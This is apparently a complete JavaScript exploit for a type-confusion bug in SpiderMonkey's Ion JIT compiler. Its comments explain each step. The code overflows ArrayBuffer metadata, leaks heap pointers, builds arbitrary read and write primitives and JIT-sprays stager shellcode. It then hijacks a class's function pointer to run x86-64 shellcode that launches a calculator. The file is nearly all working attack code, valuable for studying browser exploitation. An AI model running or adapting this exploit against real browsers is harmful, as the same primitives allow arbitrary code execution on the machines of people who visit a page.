/* Utility Functions */
String.prototype.rjust = function rjust(n,chr){
  chr = chr || '0'
  if(this.length>n)
    return this.toString();
  return (chr.repeat(n)+this.toString()).slice(-1*n);
}

String.prototype.ljust = function ljust(n,chr){
  chr = chr || '0'
  if(this.length>n)
    return this.toString();
  return (this.toString()+chr.repeat(n)).slice(0,n);
}

String.prototype.hexdecode = function hexdecode(){
  inp=this.toString();
  if (this.length%2 !=0)
  inp='0'+inp.toString();
  out=[];
  for(var i=0;i<inp.length;i+=2)
  out.push(parseInt(inp.substr(i,2),16));
  return out;
}

function print1(num){
  rep='';
  for(var i=0;i<8;i++){
    rep+=num[i].toString(16).rjust(2);
  }
  console.log("0x"+rep.rjust(16));
  // document.getElementById("demo").innerText += "0x"+rep.rjust(16) + '\n';
}


function data(inp){
  bytes='';
  if ( (typeof inp) == 'string'){
    inp=inp.replace("0x",'');
    inp=inp.rjust(16);
    bytes=new Uint8Array(inp.hexdecode());
  }
  else if (typeof inp == 'number'){
    bytes=new Uint8Array(new Float64Array([inp]).buffer);
    bytes.reverse();
  }
  else if (typeof inp == 'object'){
    bytes=new Uint8Array(8);
    bytes.set(inp);
    bytes.reverse();
  }
  return bytes;
}

function inttod(num){
  num.reverse();
  temp = new Float64Array(num.buffer)[0];
  num.reverse();
  return temp;
}

function dtoint(num){
  int=new Uint32Array(new Float64Array([num]).buffer)
  // console.log(int[1].toString(16)+int[0].toString(16));
  return int;
}

function RS(inp,amt){
    amt = amt || 1;
    num='';
    for(var i=0;i<8;i++){
      num+=inp[i].toString(2).rjust(8);
    }
    num=num.slice(0,-1*amt);
    num=num.rjust(64);
    num=parseInt(num,2).toString(16).rjust(16);
    for(var i=0,j=0;i<num.length;i+=2,j++){
      inp[j]=parseInt(num.substr(i,2),16);
    }
    return inp;
}

function LS(inp,amt){
    amt = amt || 1;
    num='';
    for(var i=0;i<8;i++){
      num+=inp[i].toString(2).rjust(8);
    }
    num=num.slice(amt);
    num=num.ljust(64);
    num=parseInt(num,2).toString(16).rjust(16);
    for(var i=0,j=0;i<num.length;i+=2,j++){
      inp[j]=parseInt(num.substr(i,2),16);
    }
    return inp;
}

function sub(inp1,inp2){
    carry=0;
    for(var i=inp1.length-1;i>=0;i--){
        diff=inp1[i]-inp2[i]-carry;
        carry=diff<0|0;
        inp1[i]=diff;
    }
    return inp1;
}

function add(inp1,inp2){
    carry=0;
    for(var i=inp1.length-1;i>=0;i--){
        sum=inp1[i]+inp2[i]+carry;
        carry=sum/0x100;
        inp1[i]=(sum%0x100);
    }
    return inp1;
}

/* Utility functions end */


/* exploit code start */

buf = []

buf.push(new ArrayBuffer(0x20));
buf.push(new ArrayBuffer(0x20));
buf.push(new ArrayBuffer(0x20));
buf.push(new ArrayBuffer(0x20));
buf.push(new ArrayBuffer(0x20));
buf.push(new ArrayBuffer(0x20));
buf.push(new ArrayBuffer(0x20));
buf.push(new ArrayBuffer(0x20));
buf.push(new ArrayBuffer(0x20));
buf.push(new ArrayBuffer(0x20));


var abuf = buf[5];

var e = new Uint32Array(abuf);
const arr = [e, e, e, e, e];

/* funtion that will trigger the bug*/

function vuln(a1) {
    /*
    If the length of the array becomes zero then we set the third element of
    the array thus converting it into a sparse array without changing the
    type of the array elements. Thus spidermonkey's Type Inference System does
    not insert a type barrier.
    */

    if (arr.length == 0) {
        arr[3] = e;
    }

    const v11 = arr.pop();

    /*
    The length of the buffer is only 8, but we are trying to add to the index
    at 18. This will not work, but no error will be thrown either.
    When the array returned by array.pop is a Uint8Array instead of a Uint32Array,
    then the size of that array is 0x20 and the index that we are trying to write
    to, i.e 18, is less than that. But keep in mind that Ion still thinks that
    this array is a Uint32Array and treats each element as a DWORD, thus resulting
    in an overflow into the metadata of the following ArrayBuffer.
    Here we are overwriting the size field of the following ArrayBuffer with a large
    size, thus leading to an overflow in the data buffer of the following ArrayBuffer
    i.e buf[6]
    */
    v11[a1] = 0x80

    for (let v15 = 0; v15 < 1000000; v15++) {} // JIT compile this function
}
/*
  Add a prototype to the arr arrray prototype chain and set the zero'th
  element as a Uint8Array to trigger the type confussion
*/

p = [new Uint8Array(abuf), e, e];
arr.__proto__ = p;

for (let v31 = 0; v31 < 2000; v31++) {
    vuln(18);
}

/*
  Now the size of the ArrayBufffer which is located at the sixth index is 0x80
  whereas it's data buffer is only 0x20.
  We use this overflow to completly control the ArrayBuffer at the 7th index
*/
leaker = new Uint8Array(buf[7]);
aa = new Uint8Array(buf[6]);

// Force a GC.
// We must trigger a full GC without triggering a compacting GC,
// as that might fill the holes again...
// Triggering the TOO_MUCH_MALLOC condition seems to do the trick.
function gc() {
    const maxMallocBytes = 128 * 0x100000;
    for (var i = 0; i < 3; i++) {
        var x = new ArrayBuffer(maxMallocBytes);
    }
}
gc()
// this should move leaker and aa to heap instead of nursery
// otherwise it fails on assertion :
//            MOZ_ASSERT_IF(buffer->byteLength() > 0, !cx->nursery().isInside(ptr));
// in ArrayBufferViewObject::init

/*
  Now leak the contents of buf[7] to obtain leaks for a Uint Array, and an
  ArrayBuffer
*/
leak = aa.slice(0x50,0x58); // start of the Uint array
group = aa.slice(0x40,0x48); // start of the array buffer
slots = aa.slice(0x40,0x48);
shape = aa.slice(0x40,0x48);

leak.reverse()
console.log("leak (pointer to leaker)");
print1(leak);

group.reverse()
slots.reverse()
shape.reverse()

/*
   Since the pointer to the start of the data buffer is right shifted, we first
   need to left shift it.
*/

LS(group)
console.log("group (pointer to data buffer of buf[7])");
print1(group);
LS(slots)
LS(shape)

/* remove the type tag */
leak[0]=0
leak[1]=0

/* Get to the data buffer of the Uint array */
add(leak,new data("0x38"))
console.log("leak pointing to data buffer of leaker (Uint8Array of buff[7])");
print1(leak);

RS(leak)
leak.reverse()
console.log("shift and reverse back leak");
console.log(leak)
print1(leak);
/*
  Set the data pointer of buf[7] using the overflow in buf[6]
  We set this pointer to point to the the address of the data pointer field of
  the Unit that we leaked.
  Thus next time a view is created using this modified ArrayBuffer, it's data pointer
  will point to the data pointer of the Uint array! So when we write something to
  this view, then the data pointer of the leaked Uint array will be overwritten.
  So we now have the power to control the data pointer a Uint array. Thus we can
  leak from any address we want and write to any address just by overwritting the
  data pointer of the Uint Array and viewing/writing to the Uint array.
  Thus we now effectively have an arbitrary read-write primitive!
*/

for (var i=0;i<leak.length;i++)
  aa[0x40+i] = leak[i]

leak.reverse()
LS(leak)
sub(leak,new data("0x10"))
console.log("leak points to the length of leaker (Uint8Array(buf[7]))");
print1(leak);
leak.reverse()

changer = new Uint8Array(buf[7])

// ----------- Read-Write Primitive -----------------
function write(addr,value){
    for (var i=0;i<8;i++)
      changer[i]=addr[i]
    value.reverse()
    for (var i=0;i<8;i++)
      leaker[i]=value[i]
}

function read(addr){
    for (var i=0;i<8;i++)
      changer[i]=addr[i]
    return leaker.slice(0,8)
}

function read_n(addr, n){
    console.log("read_n: changing the length of leaker first:");
    write(leak,n)
    for (var i=0;i<8;i++)
      changer[i]=addr[i]
    return leaker
}

// test
/*
invalidAddr = new Uint8Array([65,65,65,65,65,65,65,65]);
test = read(invalidAddr);
Math.cos(1);
console.log(test);
*/
// above gives a segmentation fault of reading invalid address 0x4141414141414141


// -------------------- control hijack ---------------------
sub(group,new data("0x40")) // this now points to the group member
sub(slots,new data("0x30")) // this now points to the slots member
sub(shape,new data("0x38")) // this now points to the shape member

console.log("group now points to the group of buf[7]")
print1(group)
console.log("slot now points to the slot of buf[7]")
print1(slots)
console.log("shape now points to the shape of buf[7]")
print1(shape)
group.reverse()
slots.reverse()
shape.reverse()

aa = read(group) // aa now contains the group pointer
aa.reverse()
console.log("aa is group pointer:")
print1(aa)
aa.reverse()

grp_ptr = read(aa) // grp_ptr is now the clasp_ pointer
grp_ptr.reverse()
console.log("grp_prt: clasp_pointer:")
print1(grp_ptr)
grp_ptr.reverse()

/* stager shellode */
buf[7].func = function func() {
  const magic = 4.183559446463817e-216;

  const g1 = 1.4501798452584495e-277
  const g2 = 1.4499730218924257e-277
  const g3 = 1.4632559875735264e-277
  const g4 = 1.4364759325952765e-277
  const g5 = 1.450128571490163e-277
  const g6 = 1.4501798485024445e-277
  const g7 = 1.4345589835166586e-277
  const g8 = 1.616527814e-314
}

/* JIT compile the shellcode */
for (i=0;i<1000000;i++) buf[7].func()

/* get the address of the executable region where Ion code is located */
slots_ptr = read(slots)
slots_ptr.reverse()
console.log("slots_ptr:")
print1(slots_ptr)
slots_ptr.reverse()

func_ptr = read(slots_ptr)
func_ptr[6]=0
func_ptr[7]=0
func_ptr.reverse()
console.log("func_ptr:")
print1(func_ptr)
func_ptr.reverse()

func_ptr.reverse()
add(func_ptr,new data("0x30"))
func_ptr.reverse()

func_ptr.reverse()
console.log("func_ptr added 0x30,")
print1(func_ptr)
func_ptr.reverse()

jit_ptr=read(func_ptr);
jit_ptr.reverse()
console.log("jit_ptr: pointer to first props of buf[7] (the new function)")
print1(jit_ptr)
jit_ptr.reverse()

jitaddr = read(jit_ptr);

/*
  Find the address of the shellcode in the executable page.
  We go back one page and then search 2 pages from there2
*/

jitaddr[0]=0
jitaddr[1]=jitaddr[1] & 0xf0

jitaddr.reverse()
console.log("jitaddr go back 1 page")
print1(jitaddr)
jitaddr.reverse()

jitaddr.reverse()
sub(jitaddr,new data("0xff0"))
jitaddr.reverse()

for(j=0;j<3;j++){
  asdf = read_n(jitaddr,new data("0xfff8800000000ff0"))
  offset=-1;
  for (var i =0;i<0xff0;i++)
  {
    if (asdf[i]==0x37 && asdf[i+1]==0x13 && asdf[i+2]==0x37 && asdf[i+3]==0x13 && asdf[i+4]==0x37 && asdf[i+5]==0x13 && asdf[i+6]==0x37 && asdf[i+7]==0x13){
      offset=i;
      break
    }
  }

  // we found the shellcode
  if(offset!=-1)
    break

  jitaddr.reverse()
  add(jitaddr,new data("0xff0"))
  jitaddr.reverse()
}

if (offset != -1) {
  console.log("we found the shellCode!!!");
}


offset = offset+8+6 // add the offset of the magic constant and also the mov instruction
jitaddr.reverse()
add(jitaddr,new data(offset.toString(16)))
console.log("jitaddr:");
print1(jitaddr);
jitaddr.reverse()
print1(jitaddr);

console.log("now start to deal with class");
group.reverse();
console.log("group");
print1(group);
group.reverse();

aa.reverse()
console.log("aa is group pointer:")
print1(aa)
aa.reverse()

console.log("grp_ptr:");
grp_ptr.reverse();
print1(grp_ptr);
grp_ptr.reverse();

// JS Class object
jsClass = read_n(grp_ptr,new data("0xfff8800000000030"));

console.log("jsClass:", jsClass);

name = jsClass.slice(0,8)
flags = jsClass.slice(8,16)
cOps = jsClass.slice(16,24)
spec = jsClass.slice(24,32)
ext = jsClass.slice(40,48)
oOps = jsClass.slice(56,64)

console.log("old cOps");
print1(cOps);

group.reverse()
add(group,new data("0x60"))
console.log("group added 0x60:")
print1(group)
group.reverse()

eight = new data("0x8")

function addEight()
{
  group.reverse()
  add(group,eight)
  group.reverse()
}

function write1(addr,value){
    for (var i=0;i<8;i++)
      changer[i]=addr[i]
    // value.reverse()
    for (var i=0;i<8;i++)
      leaker[i]=value[i]
}

// We will be writting our crafted group to this address. So we save it now
backingbuffer = group.slice(0,8)
console.log("backingbuffer:");
console.log(backingbuffer);
backingbuffer.reverse();
print1(backingbuffer);
backingbuffer.reverse(); //should be the same as group

oops = group.slice(0,8)
oops.reverse()
add(oops,new data("0x30"))
console.log("oops:");
print1(oops);
oops.reverse()

write1(group,name)
addEight()
write1(group,flags)
addEight()
write1(group,oops)
addEight()
write1(group,spec)
addEight()
write1(group,ext)
addEight()
write1(group,oOps)
addEight()

// set the addProperty function pointer to our shellcode
write1(group,jitaddr)

sc_buffer = new Uint8Array(0x1000);

buf[7].asdf=sc_buffer

// Leak the address of the shellcode UnitArray
slots_ptr.reverse()
add(slots_ptr,eight)
slots_ptr.reverse()

sc_buffer_addr = read(slots_ptr)
sc_buffer_addr[6]=0
sc_buffer_addr[7]=0

// Now get to the buffer of the shellcode array
sc_buffer_addr.reverse()
add(sc_buffer_addr,new data("0x38"))
console.log("the address of buffer of the shellcode array");
print1(sc_buffer_addr);
sc_buffer_addr.reverse()

// ptr is the pointer to the shellcode (currenty it's rw)
ptr = read(sc_buffer_addr)

ptr.reverse()
print1(ptr)
ptr.reverse()

// convert the pointer to the shellcode buffer to float
ptr.reverse()
ss=inttod(ptr)
ptr.reverse()

// Shellcode for execve("/usr/bin/xcalc",[],["DISPLAY=:0"])
sc = [72, 141, 61, 73, 0, 0, 0, 72, 49, 246, 86, 87, 84, 94, 72, 49, 210, 82, 72, 141, 21, 87, 0, 0, 0, 82, 84, 90, 176, 59, 15, 5, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 47, 117, 115, 114, 47, 98, 105, 110, 47, 120, 99, 97, 108, 99, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 68, 73, 83, 80, 76, 65, 89, 61, 58, 48, 0]

// Copy the shellcode to the shellcode buffer
for(var i=0;i<sc.length;i++)
  sc_buffer[i]=sc[i]

write1(aa,backingbuffer)

// string property does not work, should use indexed property
buf[7][3]=ss
